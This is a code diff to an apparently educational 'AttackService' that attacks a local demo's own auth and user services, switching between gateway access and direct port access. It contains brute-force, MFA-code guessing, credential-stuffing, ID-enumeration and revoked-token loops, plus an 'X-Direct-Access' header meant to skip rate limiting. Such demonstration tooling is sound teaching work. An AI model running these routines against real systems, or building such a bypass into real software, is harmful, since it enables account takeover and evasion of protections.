@@ -20,6 +20,49 @@ interface AttackExecutionResult {
 }
 
 class AttackService {
+  private securityEnabled: boolean = true
+
+  /**
+   * Set security mode (affects which endpoints are used)
+   * @param enabled - true = use gateway (security ON), false = direct access (security OFF)
+   */
+  setSecurityMode(enabled: boolean): void {
+    console.log(`[AttackService] Security mode changed: ${enabled ? 'ON (gateway)' : 'OFF (direct access)'}`)
+    this.securityEnabled = enabled
+  }
+
+  /**
+   * Get current security mode
+   */
+  getSecurityMode(): boolean {
+    return this.securityEnabled
+  }
+
+  /**
+   * Get endpoint URL based on security mode
+   * Security ON: use gateway endpoints (with JWT, WAF, rate limiting)
+   * Security OFF: use direct service access (bypass all protections)
+   */
+  private getLoginEndpoint(): string {
+    return this.securityEnabled ? ENDPOINTS.AUTH.LOGIN : ENDPOINTS.DIRECT_ACCESS.AUTH.LOGIN
+  }
+
+  private getMFAVerifyEndpoint(): string {
+    return this.securityEnabled ? ENDPOINTS.AUTH.MFA_VERIFY : ENDPOINTS.DIRECT_ACCESS.AUTH.MFA_VERIFY
+  }
+
+  private getRefreshEndpoint(): string {
+    return this.securityEnabled ? ENDPOINTS.AUTH.REFRESH : ENDPOINTS.DIRECT_ACCESS.AUTH.REFRESH
+  }
+
+  private getUserProfileEndpoint(userId: number): string {
+    return this.securityEnabled ? ENDPOINTS.USER.PROFILE(userId) : ENDPOINTS.DIRECT_ACCESS.USER.PROFILE(userId)
+  }
+
+  private getUserHealthEndpoint(): string {
+    return this.securityEnabled ? ENDPOINTS.GATEWAY.HEALTH : ENDPOINTS.DIRECT_ACCESS.USER.HEALTH
+  }
+
   /**
    * Add log entry with timestamp
    */
@@ -47,6 +90,80 @@ class AttackService {
   }
 
   /**
+   * Execute POST request (respects security mode)
+   * Security ON: use apiClient (goes through gateway with JWT)
+   * Security OFF: use fetch (direct access, bypass gateway)
+   */
+  private async post<T>(url: string, data: unknown): Promise<T> {
+    if (this.securityEnabled) {
+      // Security ON: use apiClient (gateway + JWT + WAF + rate limiting)
+      return apiClient.post<T>(url, data)
+    } else {
+      // Security OFF: direct access (bypass all protections)
+      // Use full URL to bypass Vite proxy
+      const fullUrl = url.startsWith('http') ? url : `http://localhost:8000${url.replace('/direct/auth-service', '')}`
+      console.log(`[POST] Fetching: ${fullUrl}`)
+
+      const response = await fetch(fullUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Direct-Access': 'true', // Signal to backend: bypass rate limiting
+        },
+        body: JSON.stringify(data),
+      })
+
+      if (!response.ok) {
+        throw {
+          status: response.status,
+          message: response.statusText || 'Request failed',
+        }
+      }
+
+      return response.json()
+    }
+  }
+
+  /**
+   * Execute GET request (respects security mode)
+   */
+  private async get<T>(url: string): Promise<T> {
+    if (this.securityEnabled) {
+      // Security ON: use apiClient
+      return apiClient.get<T>(url)
+    } else {
+      // Security OFF: direct access
+      // Determine service port based on URL
+      let fullUrl = url
+      if (!url.startsWith('http')) {
+        if (url.includes('/direct/user-service')) {
+          fullUrl = `http://localhost:8002${url.replace('/direct/user-service', '')}`
+        } else if (url.includes('/direct/auth-service')) {
+          fullUrl = `http://localhost:8000${url.replace('/direct/auth-service', '')}`
+        }
+      }
+      console.log(`[GET] Fetching: ${fullUrl}`)
+
+      const response = await fetch(fullUrl, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Direct-Access': 'true', // Signal to backend: bypass rate limiting
+        },
+      })
+
+      if (!response.ok) {
+        throw {
+          status: response.status,
+          message: response.statusText || 'Request failed',
+        }
+      }
+
+      return response.json()
+    }
+  }
+
+  /**
    * ATTACK 1: Brute Force
    * Try multiple username/password combinations
    */
@@ -59,6 +176,9 @@ class AttackService {
     let successfulAttempts = 0
     let blockedRequests = 0
 
+    console.log(`[BruteForce] Security mode: ${this.securityEnabled ? 'ON' : 'OFF'}`)
+    console.log(`[BruteForce] Endpoint: ${this.getLoginEndpoint()}`)
+
     logs.push(this.log(`Starting brute force attack on user: ${targetUsername}`, 'info', onProgress))
     logs.push(this.log(`Testing ${passwordList.length} passwords...`, 'info', onProgress))
 
@@ -70,7 +190,7 @@ class AttackService {
           this.log(`[${i + 1}/${passwordList.length}] Trying: ${password}`, 'info', onProgress)
         )
 
-        const response = await apiClient.post<{ success: boolean }>(ENDPOINTS.AUTH.LOGIN, {
+        const response = await this.post<{ success: boolean }>(this.getLoginEndpoint(), {
           username: targetUsername,
           password,
         })
@@ -141,7 +261,7 @@ class AttackService {
       try {
         logs.push(this.log(`Requesting profile for user_id: ${userId}`, 'info', onProgress))
 
-        const profile = await apiClient.get<UserProfile>(ENDPOINTS.USER.PROFILE(userId))
+        const profile = await this.get<UserProfile>(this.getUserProfileEndpoint(userId))
 
         extractedProfiles.push(profile)
         logs.push(
@@ -190,14 +310,11 @@ class AttackService {
       this.log('Attempting to access services directly on exposed ports', 'info', onProgress)
     )
 
-    // In dev: use proxy paths, in prod: direct localhost URLs
-    const isDev = import.meta.env.DEV
-
-    // Try to access user service directly (port 8002)
+    // Direct access endpoints (bypass gateway)
     const directEndpoints = [
-      { url: isDev ? '/direct/user-service/health' : 'http://localhost:8002/health', service: 'User Service' },
-      { url: isDev ? '/direct/user-service/api/users/settings' : 'http://localhost:8002/api/users/settings', service: 'User Settings (no auth)' },
-      { url: isDev ? '/direct/auth-service/health' : 'http://localhost:8000/health', service: 'Auth Service' },
+      { url: ENDPOINTS.DIRECT_ACCESS.USER.HEALTH, service: 'User Service' },
+      { url: ENDPOINTS.DIRECT_ACCESS.USER.SETTINGS, service: 'User Settings (no auth)' },
+      { url: ENDPOINTS.DIRECT_ACCESS.AUTH.HEALTH, service: 'Auth Service' },
     ]
 
     for (const endpoint of directEndpoints) {
@@ -307,8 +424,7 @@ class AttackService {
       this.log('Phase 2: Bypassing rate limit via direct service access...', 'info', onProgress)
     )
 
-    const isDev = import.meta.env.DEV
-    const directUrl = isDev ? '/direct/user-service/health' : 'http://localhost:8002/health'
+    const directUrl = ENDPOINTS.DIRECT_ACCESS.USER.HEALTH
 
     for (let i = 0; i < Math.min(requestCount, 50); i++) {
       try {
@@ -382,7 +498,7 @@ class AttackService {
       try {
         logs.push(this.log(`Trying MFA code: ${codeStr}`, 'info', onProgress))
 
-        await apiClient.post(ENDPOINTS.AUTH.MFA_VERIFY, {
+        await this.post(this.getMFAVerifyEndpoint(), {
           challenge_id: challengeId,
           code: codeStr,
         })
@@ -437,7 +553,7 @@ class AttackService {
     logs.push(this.log(`Attempting to use revoked token: ${revokedToken.substring(0, 20)}...`, 'info', onProgress))
 
     try {
-      await apiClient.post(ENDPOINTS.AUTH.REFRESH, {
+      await this.post(this.getRefreshEndpoint(), {
         refresh_token: revokedToken,
       })
 
@@ -493,7 +609,7 @@ class AttackService {
           this.log(`[${i + 1}/${credentialPairs.length}] Testing: ${username}`, 'info', onProgress)
         )
 
-        const response = await apiClient.post<{ success: boolean }>(ENDPOINTS.AUTH.LOGIN, {
+        const response = await this.post<{ success: boolean }>(this.getLoginEndpoint(), {
           username,
           password,
         })
